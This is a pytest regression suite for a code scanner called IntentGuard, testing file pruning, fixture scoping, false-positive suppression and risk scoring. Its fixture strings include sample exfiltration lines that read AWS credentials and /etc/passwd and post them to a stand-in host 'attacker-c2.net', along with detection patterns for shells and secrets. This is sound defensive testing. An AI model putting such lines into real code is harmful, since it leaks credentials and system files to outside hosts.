"""Regression tests for the false positives seen when IntentGuard scans itself."""

from engine.agents.annotated_code import pattern_annotate
from engine.agents.ingestion import _collect_files, ingest
from engine.agents.scope import DOCS, FIXTURE, PRODUCTION, classify_rel
from engine.agents.semantic import _heuristic_nutrition, _parse_json_block

SCANNER_BUNDLE = """=== engine/agents/ingestion.py ===
subprocess.run(["git", "clone", url])
data = path.read_text()

=== engine/agents/annotated_code.py ===
("shell=True", "Prompt-injection-to-shell risk", "high"),
("/.ssh", "Sensitive filesystem scope", "medium"),
_SENSITIVE = re.compile(r"password|token|api[_-]?key")
fns = _extract_candidate_functions(code, "subprocess.run")
if "os.system" in code:
raise RuntimeError("OPENAI_API_KEY is not set")

=== demo/samples/log_collector.py ===
requests.post("https://api.telemetry-pipe.io/ingest", json=payload)
ssh = os.path.expanduser("~/.ssh")
subprocess.run(cmd, shell=True)

=== FINALTEST.md ===
OPENAI_API_KEY=...
docker compose up -d db-neo4j db-mongo
"""

EXFILTRATION_BUNDLE = """=== agent/collector.py ===
secret = os.environ["AWS_ACCESS_KEY_ID"]
requests.post("https://drop.attacker-c2.net/ingest", json=secret)
"""


def test_vendored_and_generated_files_are_pruned(tmp_path):
    repo = tmp_path / "repo"
    (repo / "node_modules" / "left-pad").mkdir(parents=True)
    (repo / ".git").mkdir()
    (repo / "src").mkdir()
    (repo / "node_modules" / "left-pad" / "index.json").write_text("{}", encoding="utf-8")
    (repo / ".git" / "config.json").write_text("{}", encoding="utf-8")
    (repo / "package-lock.json").write_text("{}", encoding="utf-8")
    (repo / "src" / "agent.py").write_text("x = 1\n", encoding="utf-8")

    files, skipped = _collect_files(repo)
    names = {p.name for p in files}

    assert names == {"agent.py"}
    assert skipped["excluded_files"] >= 1
    assert skipped["pruned_dirs"] >= 2


def test_oversized_files_are_skipped(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "small.py").write_text("x = 1\n", encoding="utf-8")
    (repo / "huge.json").write_text("[" + ("0," * 400_000) + "0]", encoding="utf-8")

    files, skipped = _collect_files(repo)

    assert {p.name for p in files} == {"small.py"}
    assert skipped["oversized_files"] == 1


def test_scope_classification():
    assert classify_rel("engine/agents/semantic.py") == PRODUCTION
    assert classify_rel("demo/samples/log_collector.py") == FIXTURE
    assert classify_rel("examples/agent.md") == FIXTURE
    assert classify_rel("README.md") == DOCS
    assert classify_rel("FINALTEST.md") == DOCS
    assert classify_rel("docs/setup.md") == DOCS
    # An agent skill whose name merely contains "test" is still production code.
    assert classify_rel("skills/pentest.md") == PRODUCTION


def test_explicit_single_file_scan_is_always_production():
    """Pointing the scanner at a honeypot directly should still score it fully."""
    workspace = ingest("./demo/samples/devops_troubleshooter.md")
    assert workspace.scan_scope["scopes"] == {"production": 1}


def test_detector_definitions_are_not_reported_as_vulnerabilities():
    rows = pattern_annotate(SCANNER_BUNDLE)
    flagged = {row["file"] for row in rows}
    assert "engine/agents/annotated_code.py" not in flagged


def test_real_invocations_are_still_reported():
    rows = pattern_annotate("=== app.py ===\nsubprocess.run(cmd, shell=True)\n")
    assert any(row["annotation"] == "Prompt-injection-to-shell risk" for row in rows)


def test_fixture_rows_are_labelled_not_dropped():
    rows = pattern_annotate(SCANNER_BUNDLE)
    fixture_rows = [row for row in rows if row["file"] == "demo/samples/log_collector.py"]
    assert fixture_rows, "fixture findings should still be reported"
    assert all(row["scope"] == FIXTURE for row in fixture_rows)


def test_scanner_repo_is_not_scored_critical():
    report = _heuristic_nutrition(SCANNER_BUNDLE, [])
    breakdown = report.meta["score_breakdown"]

    assert report.risk_label != "Critical"
    assert report.risk_score <= 7.0
    assert report.meta["confidence"] == "low"
    # Fixtures and docs are analyzed but must not drive the aggregate.
    assert "demo/samples/log_collector.py" in report.meta["excluded_from_score"]
    assert "FINALTEST.md" in report.meta["excluded_from_score"]
    assert all("annotated_code.py" not in f for files in breakdown["signal_files"].values() for f in files)


def test_genuine_exfiltration_chain_still_scores_high():
    report = _heuristic_nutrition(EXFILTRATION_BUNDLE, [])

    assert report.risk_score >= 6.0
    assert report.meta["score_breakdown"]["exfiltration_chains"] == ["agent/collector.py"]
    assert any(finding.id == "h4" for finding in report.findings)


def test_heuristic_score_is_capped_below_critical():
    everything = """=== agent/kitchen_sink.py ===
secret = os.environ["AWS_ACCESS_KEY_ID"]
key = open("/etc/passwd").read()
requests.post("https://drop.attacker-c2.net", json=key)
requests.get("https://attacker-c2.net/cmd")
subprocess.run(cmd, shell=True)
eval(payload)
"""
    report = _heuristic_nutrition(everything, [])

    assert report.meta["score_breakdown"]["capped"] is True
    assert report.risk_score == 7.0
    assert report.risk_label == "High"


def test_annotations_dedupe_across_path_separator_styles():
    from engine.agents.annotated_code import merge_annotations

    llm_row = {"file": "engine/agents/ingestion.py", "annotation": "External command execution", "line": 5}
    pattern_row = {"file": "engine\\agents\\ingestion.py", "annotation": "External command execution", "line": 5}

    merged = merge_annotations([llm_row], [pattern_row])

    assert len(merged) == 1
    assert merged[0]["file"] == "engine/agents/ingestion.py"


def test_parse_json_block_recovers_from_trailing_commas():
    parsed = _parse_json_block('{"risk_score": 4.0, "findings": [1, 2,],}')
    assert parsed["risk_score"] == 4.0
    assert parsed["findings"] == [1, 2]


def test_parse_json_block_recovers_from_truncated_response():
    parsed = _parse_json_block('{"intent_summary": "partial", "findings": [{"id": "a"')
    assert parsed["intent_summary"] == "partial"


def test_parse_json_block_strips_fences_and_prose():
    parsed = _parse_json_block('Here is the result:\n```json\n{"risk_score": 2.0}\n```')
    assert parsed["risk_score"] == 2.0
